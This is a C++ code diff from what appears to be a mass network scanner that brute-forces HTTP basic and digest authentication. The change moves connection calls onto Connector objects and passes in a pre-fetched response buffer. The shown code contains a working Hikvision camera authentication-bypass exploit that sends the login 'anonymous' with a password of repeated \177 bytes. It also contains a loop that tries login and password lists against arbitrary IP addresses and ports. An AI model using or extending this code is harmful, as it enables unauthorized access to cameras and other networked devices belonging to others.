@@ -39,25 +39,21 @@ inline bool commenceHikvisionEx1(const char *ip, const int port, bool digestMode
 	std::string lpString = string("anonymous") + ":" + string("\177\177\177\177\177\177");
 
 	string buffer;
-	int res = Connector::nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
+	Connector con;
+	int res = con.nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
 	if (res > 0) {
 		if (BA::checkOutput(&buffer, ip, port) == 1) return 1;
 	}
 	return 0;
 }
 
-lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
-    string buffer;
+lopaStr BA::BABrute(const char *ip, const int port, bool digestMode, const std::string *buff) {
     string lpString;
     lopaStr lps = {"UNKNOWN", "", ""};
     int passCounter = 0;
 	int res = 0;
 	
-	res = Connector::nConnect(ip, port, &buffer);
-	if (res == -2) return lps;
-
-	int isDig = 0;
-	isDig = Utils::isDigest(&buffer);
+	int isDig = Utils::isDigest(buff);
 	if (isDig == -1) {
 		stt->doEmitionFoundData("<span style=\"color:orange;\">No 401 detected - <a style=\"color:orange;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" +
 		QString(ip) + ":" + QString::number(port) + "</a></span>");
@@ -79,6 +75,8 @@ lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
 		};
 	}
 
+	std::string buffer;
+
 	if (commenceHikvisionEx1(ip, port, digestMode)) {
 		stt->doEmitionGreenFoundData("Hikvision exploit triggered! (" + 
 			QString(ip) + ":" + 
@@ -95,7 +93,8 @@ lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
 
             lpString = string(loginLst[i]) + ":" + string(passLst[j]);
 
-			res = Connector::nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
+			Connector con;
+			res = con.nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
 			if (res == -2) return lps;
 			else if (res != -1) {
 				res = checkOutput(&buffer, ip, port);
@@ -125,14 +124,14 @@ lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
     return lps;
 }
 
-lopaStr BA::BALobby(const char *ip, const int port, bool digestMode) {
+lopaStr BA::BALobby(const char *ip, const int port, bool digestMode, const std::string *buffer) {
     if(gMaxBrutingThreads > 0) {
 
         while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);
 
 		++baCount;
 		++BrutingThrds;
-        const lopaStr &lps = BABrute(ip, port, digestMode);
+		const lopaStr &lps = BABrute(ip, port, digestMode, buffer);
 		--BrutingThrds;
 
         return lps;
